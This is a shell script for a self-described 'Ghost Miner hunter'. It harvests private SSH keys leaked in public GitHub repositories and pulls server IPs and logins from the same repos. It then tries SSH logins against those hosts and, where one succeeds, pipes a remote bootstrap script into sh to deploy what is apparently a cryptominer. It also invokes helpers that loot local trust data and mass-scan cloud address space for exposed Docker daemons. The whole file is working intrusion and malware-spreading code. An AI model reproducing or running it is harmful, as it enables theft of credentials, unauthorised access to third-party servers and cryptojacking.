#!/bin/sh
# ============================================================================
# Ghost Miner hunter - find (key, host) pairs on GitHub, probe them over SSH,
# and deploy with the same bootstrap. Run from your desktop or from any host:
#
#   GITHUB_TOKEN=xxx ./hunt.sh harvest    # candidates -> .hunt/targets.txt
#   ./hunt.sh probe                        # ssh-probe + deploy
#   ./hunt.sh all                          # both (default)
#
# Needs: curl, tar, ssh, awk/sed/grep/sort. No git, no jq.
# State, next to this script:  .hunt/keys/  .hunt/targets.txt  .hunt/seen.txt
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK/keys"
TARGETS="$WORK/targets.txt"
SEEN="$WORK/seen.txt"
OWNED="$WORK/owned.txt"
LOOT="$WORK/loot.txt"
touch "$TARGETS" "$SEEN" "$OWNED" "$LOOT"

# env wins over the file, so `GITHUB_TOKEN=x ./hunt.sh` still works
env_token="${GITHUB_TOKEN:-}"; env_config="${CONFIG_URL:-}"
if [ -r "$SELF_DIR/worker.env" ]; then . "$SELF_DIR/worker.env"; fi
TOKEN="${env_token:-${GITHUB_TOKEN:-}}"
CONFIG_URL="${env_config:-${CONFIG_URL:-}}"
HOSTS_PER_REPO="${HOSTS_PER_REPO:-5}"
TARGET_USERS="${TARGET_USERS:-root}"
MAX_REPOS="${HUNT_MAX_REPOS:-50}"
# A run must fit inside the unit's 30-minute TimeoutStartSec. seen.txt records
# every attempt, so hitting this cap leaves the rest queued for the next run
# instead of getting SIGTERMed halfway.
MAX_PROBE="${HUNT_MAX_PROBE:-250}"
TAB=$(printf '\t')

api() {
    if [ -n "$TOKEN" ]; then
        curl -fsSL -H "Authorization: Bearer $TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" "$1"
    else
        curl -fsSL -H "Accept: application/vnd.github+json" "$1"
    fi
}

# One code-search request -> the /blob/ file urls of the hits. Three html_urls
# come back per hit (owner, repo, file) and only the file one has /blob/.
search() {
    # Code search allows 10 calls/minute, so a 403 is not an error - it is "you
    # caught up". Pace the calls and retry, instead of silently losing a whole
    # query's worth of candidates (which is what made the pool look tiny).
    tries=0
    while [ "$tries" -lt 3 ]; do
        tries=$((tries + 1))
        body=$(api "https://api.github.com/search/code?q=$1&per_page=100${2:-}" 2>/dev/null) || body=""
        if [ -n "$body" ]; then
            printf '%s' "$body" | grep -oE '"html_url": *"[^"]+"' \
              | grep '/blob/' \
              | sed -e 's/.*"https:/https:/' -e 's/"$//' >> "$WORK/urls.txt" || true
            sleep 2
            return 0
        fi
        sleep 8
    done
    echo "hunt: search '$1' gave nothing (rate limit?)" >&2
}

# Hosts = public addresses mentioned in the repo that leaked the key. Two passes:
# config/deploy/doc files first (that is where real addresses actually live),
# then the whole tree to top up the remainder. Order = how often it shows up.
# The strict octet pattern rejects version strings such as 00.00.01.01.
IP_RE='\b(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}\b'
# Addresses that can never be our host - a row on one is a wasted ssh attempt.
# Two shapes of junk, both seen in the live queue: whole *networks* we can never
# be (private/reserved/CGNAT, and CDN/front ends - they serve pages, they never
# run our key) and the individual junk strings READMEs love (placeholders, kernel
# versions, SNMP OIDs, soname/libtool strings, public DNS).
# NB: a network is a *prefix*. Anchoring it as though it were a whole address was
# the bug that let 10.212.136.52 and 192.168.1.2 through.
IP_NETS='0|10|127|169\.254|192\.168|192\.0\.2|198\.51\.100|203\.0\.113|22[4-9]|2[3-5][0-9]|100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])|172\.(1[6-9]|2[0-9]|3[01])|192\.30|140\.82|185\.199|74\.12[5-9]|74\.6|64\.233|66\.249|72\.14|216\.58|172\.217|142\.250|209\.85|151\.101|199\.16|13\.107|40\.126|104\.(1[6-9]|2[0-9]|3[01])'
IP_EXACT='1\.0\.0\.[01]|1\.1\.1\.1|1\.2\.3\.4|2\.2\.2\.2|3\.3\.3\.3|4\.4\.4\.4|5\.6\.7\.8|8\.8\.4\.4|8\.8\.8\.8|9\.9\.9\.9|114\.114\.114\.114|123\.123\.123\.123|208\.67\.(220|222)\.22[02]|223\.5\.5\.5|1\.3\.6\.1|1\.4\.3\.1|1\.6\.[01]\.[0-9]|1\.7\.2\.4|1\.9\.[02]\.[0-9][0-9]?|2\.5\.4\.42|2\.6\.24\.7|2\.6\.33\.[79]|3\.4\.0\.30|3\.6\.11\.[25]|3\.8\.2\.7|3\.14\.15\.92|4\.2\.1\.10|7\.4\.[27]\.[14]|8\.2\.1\.2|8\.5\.3\.2|12\.2\.6\.4|12\.34\.56\.78|14\.0\.1\.0'
IP_BAD="^((${IP_NETS})\..*|(${IP_EXACT}))\$"
# A repo that literally writes "user@1.2.3.4" (deploy script, ssh config, README)
# names BOTH the host and the login. That beats guessing users against an
# arbitrary IP, so those pairs are emitted first and logged to pairs.txt.
USER_AT_RE='[A-Za-z_][A-Za-z0-9_-]*@([0-9]{1,3}\.){3}[0-9]{1,3}'
# awk sees these as ERE, where the backslashes are just noise (and warn)
IP_BAD_AWK=$(printf '%s' "$IP_BAD" | tr -d '\\')
rank_ips() {
    # awk, not grep -vE: the same filter as the prune below (the ERE has to
    # survive being a variable, and this form is the one that demonstrably drops
    # private/reserved/front addresses instead of letting them into the queue).
    awk -v junk="$IP_BAD_AWK" '$0 !~ junk { c[$0]++ } END { for (i in c) printf "%d %s\n", c[i], i }' \
      | sort -rn | awk '{print $2}'
}

# ssh-config stanzas: HostName + User in one block is the same precise pair, and
# it lives in exactly the repos that deploy things next to their key. Plain awk
# (no IGNORECASE), lowercased keyword compare, works whichever order they appear.
sshcfg_pairs() {
    grep -rlE '^[[:space:]]*HostName[[:space:]]' "$1" 2>/dev/null | head -n 40 \
      | while read -r f; do
            awk '
                function emit() {
                    if (hn == "") return
                    if (hn !~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/) { hn = ""; return }
                    printf "%s@%s\n", (us == "" ? "root" : us), hn
                    hn = ""
                }
                { k = tolower($1) }
                k == "host"     { emit(); us = "" }
                k == "user"     { us = $2; emit() }
                k == "hostname" { hn = $2; emit() }
            ' "$f" 2>/dev/null
        done | sort -u
}

repo_hosts() {
    d="$WORK/tmp.$$"; rm -rf "$d"; mkdir -p "$d"
    if curl -fsSL "https://codeload.github.com/$1/tar.gz/HEAD" 2>/dev/null \
         | tar -xz -C "$d" 2>/dev/null; then
        grep -rshoE "$IP_RE" \
             --include='*.tf' --include='*.tfvars' --include='*.yml' --include='*.yaml' \
             --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.env' \
             --include='*.properties' --include='*.sh' --include='*.md' --include='*.txt' \
             --include='hosts' --include='Dockerfile*' --include='*compose*' \
             "$d" 2>/dev/null | rank_ips > "$d/t1" || true
        grep -rshoE "$IP_RE" "$d" 2>/dev/null | rank_ips > "$d/t2" || true
        # precise pass: how a server and its login are actually written down -
        # "user@host" anywhere in the tree, plus ssh-config stanzas. These beat
        # guessing four usernames against an arbitrary IP, so they go first.
        {
            grep -rshoE "$USER_AT_RE" "$d" 2>/dev/null
            sshcfg_pairs "$d"
        } | sort -u \
          | awk -F@ -v junk="$IP_BAD_AWK" '$NF !~ junk { print }' \
          | head -n "$((HOSTS_PER_REPO * 4))" > "$WORK/last.userip" || true
        cat "$d/t1"
        if [ -s "$d/t1" ]; then
            grep -vxF -f "$d/t1" "$d/t2" 2>/dev/null || true
        else
            cat "$d/t2"
        fi
    fi
    rm -rf "$d"
}

# ---------------------------------------------------------------------------
harvest() {
    if [ -z "$TOKEN" ]; then
        echo "hunt: no GITHUB_TOKEN (GitHub code search requires auth)" >&2
        return 0
    fi
    : > "$WORK/urls.txt"; : > "$WORK/repos.txt"; : > "$WORK/pairs.txt"
    # Rows collected before the junk filters existed can be impossible hosts
    # (placeholders, CDN fronts, version strings). Every row costs a real ssh
    # attempt, so drop them - and keep the precise pair rows first.
    if [ -s "$TARGETS" ]; then
        before=$(wc -l < "$TARGETS")
        awk -F'\t' -v junk="$IP_BAD_AWK" '$3 != "" && $3 !~ junk' "$TARGETS" > "$TARGETS.p" \
            && mv -f "$TARGETS.p" "$TARGETS" || rm -f "$TARGETS.p"
        after=$(wc -l < "$TARGETS")
        [ "$before" = "$after" ] || echo "hunt: pruned $((before - after)) impossible rows"
    fi
    # prune dead keys harvested before the -SK / unparseable filters existed
    for k in "$WORK"/keys/*; do
        [ -f "$k" ] || continue
        kinfo=$(ssh-keygen -l -f "$k" 2>/dev/null) || { rm -f "$k"; continue; }
        case "$kinfo" in *-SK*) rm -f "$k" ;; esac
    done
    # NOTE: each search result carries three html_urls - owner, repository and
    # the file itself. Only the file one contains /blob/, so keep just those,
    # otherwise an org URL can register a repo name and shadow the real key URL.
    # NOTE: per_page is what bounds the whole run - 3 queries x per_page is the
    # entire candidate pool, and only ~10% of urls are distinct repos. At
    # per_page=20 the pool is 60 urls (~6 repos) so HUNT_MAX_REPOS never even
    # binds; 100 is the API maximum and makes the pool ~300.
    # A key committed next to ansible/terraform/deploy files is far more likely
    # to be a *server* key than a random id_rsa, so bias the search that way:
    # half the queries are plain, half demand an infra marker as well.
    # filename:id_key matters because that is what THIS kit calls its own key,
    # so without it the hunter can never discover the kit's own repo.
    # Keep the count at <=10: the code_search budget is 10 requests/minute.
    for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY' \
             'filename:id_key' 'filename:id_rsa+ansible' 'filename:id_rsa+terraform' \
             'filename:.pem+inventory'; do
        search "$q"
    done
    # Second page of the most valuable queries: per_page is what bounds the whole
    # run, and paging 3 of them roughly doubles the pool for 3 more requests -
    # inside the 10 code-search calls/minute budget. (Only ~10% of urls are
    # distinct repos, so the pool is the real constraint, not HUNT_MAX_REPOS.)
    for q in 'filename:id_rsa+ansible' 'filename:id_rsa+terraform' \
             'filename:.pem+PRIVATE+KEY'; do
        search "$q" '&page=2'
    done
    sort -u "$WORK/urls.txt" > "$WORK/urls.uniq"
    # Shuffle so successive runs do not keep re-inspecting the same top repos,
    # then keep a bounded slice (6 urls per repo absorbs repo collisions).
    sort -R "$WORK/urls.uniq" 2>/dev/null > "$WORK/urls.sorted" || true
    [ -s "$WORK/urls.sorted" ] || cp "$WORK/urls.uniq" "$WORK/urls.sorted"
    head -n "$((MAX_REPOS * 6))" "$WORK/urls.sorted" > "$WORK/urls.head"
    mv "$WORK/urls.head" "$WORK/urls.sorted"

    while read -r url; do
        [ -n "${url:-}" ] || continue
        rest=${url#https://github.com/}
        repo=$(printf '%s' "$rest" | cut -d/ -f1,2)
        ref=$(printf '%s' "$rest" | cut -d/ -f4)
        path=$(printf '%s' "$rest" | cut -d/ -f5-)
        if [ -z "$ref" ] || [ -z "$path" ]; then continue; fi
        grep -qxF "$repo" "$WORK/repos.txt" && continue
        [ "$(tr -d ' ' < "$WORK/repos.txt" | wc -l)" -ge "$MAX_REPOS" ] && break
        printf '%s\n' "$repo" >> "$WORK/repos.txt"

        keyfile="$WORK/keys/$(printf '%s' "$repo" | tr '/' '_')"
        curl -fsSL "https://raw.githubusercontent.com/$repo/$ref/$path" \
             -o "$keyfile" 2>/dev/null || { rm -f "$keyfile"; continue; }
        grep -q 'PRIVATE KEY' "$keyfile" || { rm -f "$keyfile"; continue; }
        if grep -q 'ENCRYPTED' "$keyfile"; then rm -f "$keyfile"; continue; fi
        # A key that cannot even be parsed, or a hardware (*-SK) key whose private
        # half actually lives on a FIDO token, can never authenticate from a file.
        kinfo=$(ssh-keygen -l -f "$keyfile" 2>/dev/null) || { rm -f "$keyfile"; continue; }
        case "$kinfo" in *-SK*) rm -f "$keyfile"; continue ;; esac
        chmod 0600 "$keyfile"

        hosts=$(repo_hosts "$repo" | head -n "$HOSTS_PER_REPO")
        # precise rows first, and kept for inspection in pairs.txt
        if [ -s "$WORK/last.userip" ]; then
            while IFS=@ read -r pu ph; do
                [ -n "${ph:-}" ] || continue
                printf '%s\t%s\t%s\n' "$keyfile" "$pu" "$ph"
                printf '%s\t%s\t%s\n' "$keyfile" "$pu" "$ph" >> "$WORK/pairs.txt"
            done < "$WORK/last.userip" >> "$TARGETS"
        fi
        [ -n "$hosts" ] || continue
        printf '%s\n' "$hosts" | while read -r h; do
            for u in $TARGET_USERS; do
                printf '%s\t%s\t%s\n' "$keyfile" "$u" "$h"
            done
        done >> "$TARGETS"
    done < "$WORK/urls.sorted"

    sort -u "$TARGETS" -o "$TARGETS"
    echo "hunt: $(wc -l < "$TARGETS") candidate rows from $(wc -l < "$WORK/repos.txt") repos"
}

# ---------------------------------------------------------------------------
probe() {
    if [ ! -s "$TARGETS" ] && [ ! -s "$LOOT" ]; then
        echo "hunt: no candidates to probe"; return 0
    fi
    [ -n "$CONFIG_URL" ] || echo "hunt: CONFIG_URL unset - will test logins only" >&2
    tried=0
    # looted rows first: those triples were proven together on a live host,
    # where the GitHub ones are only correlated by repo. Precision gets budget.
    { cat "$LOOT" 2>/dev/null || :; cat "$TARGETS" 2>/dev/null || :; } \
    | while IFS="$TAB" read -r key user host; do
        [ -n "${host:-}" ] || continue
        id="$user@$host"
        # Count a row only when it is actually attempted. Counting scanned rows
        # let a run burn its entire budget skipping rows already in seen.txt.
        grep -qxF "$id" "$SEEN" 2>/dev/null && continue
        tried=$((tried + 1))
        [ "$tried" -gt "$MAX_PROBE" ] && { echo "hunt: probe cap $MAX_PROBE attempts hit, rest stays queued"; break; }
        # ConnectTimeout only bounds the TCP connect. A host that accepts the
        # socket but never sends an SSH banner can still stall the run, so wrap
        # the attempt: worst case must stay inside the unit's 30-minute timeout.
        if timeout 6 ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
               -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
               -o ConnectTimeout=3 -o ConnectionAttempts=1 "$id" true 2>/dev/null; then
            echo "hunt: login OK -> $id"
            if [ -n "$CONFIG_URL" ] && \
               timeout 180 ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no \
                   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$id" \
                   "curl -fsSL $CONFIG_URL/bootstrap.sh | CONFIG_URL=$CONFIG_URL sh" \
                   2>/dev/null; then
                printf '%s\n' "$id" >> "$OWNED"
                echo "hunt: DEPLOYED -> $id"
            fi
        fi
        printf '%s\n' "$id" >> "$SEEN"
    done
    sort -u "$OWNED" -o "$OWNED" 2>/dev/null || true
}

# Read this host's own trust graph before harvesting: its ssh config,
# known_hosts, own keys and history are far better edges than anything GitHub
# can correlate, and hunt.sh probes loot.txt before its own rows.
loot_now() {
    if [ -r "$SELF_DIR/loot.sh" ]; then
        HUNT_WORK="$WORK" sh "$SELF_DIR/loot.sh" || true
    fi
}

# Exposed docker daemons need no credentials at all - run it after the ssh pass
# so the queue (every IP any repo mentioned) is already populated.
dock_now() {
    if [ -r "$SELF_DIR/dock.sh" ]; then
        HUNT_WORK="$WORK" sh "$SELF_DIR/dock.sh" || true
    fi
}

# The repo queue is small and mostly noise (placeholders, version strings, CDN
# IPs), so the docker vector gets its volume from cloud /16 space instead.
# Bounded by MASS_BUDGET seconds, so this is safe inside a combined run.
mass_now() {
    if [ -r "$SELF_DIR/dockmass.sh" ]; then
        HUNT_WORK="$WORK" sh "$SELF_DIR/dockmass.sh" || true
    fi
}

case "${1:-all}" in
    loot)    loot_now ;;
    dock)    dock_now ;;
    mass)    mass_now ;;
    harvest) harvest ;;
    probe)   probe ;;
    all)     loot_now; harvest; probe; dock_now; mass_now ;;
    *)       echo "usage: $0 [loot|dock|mass|harvest|probe|all]"; exit 2 ;;
esac
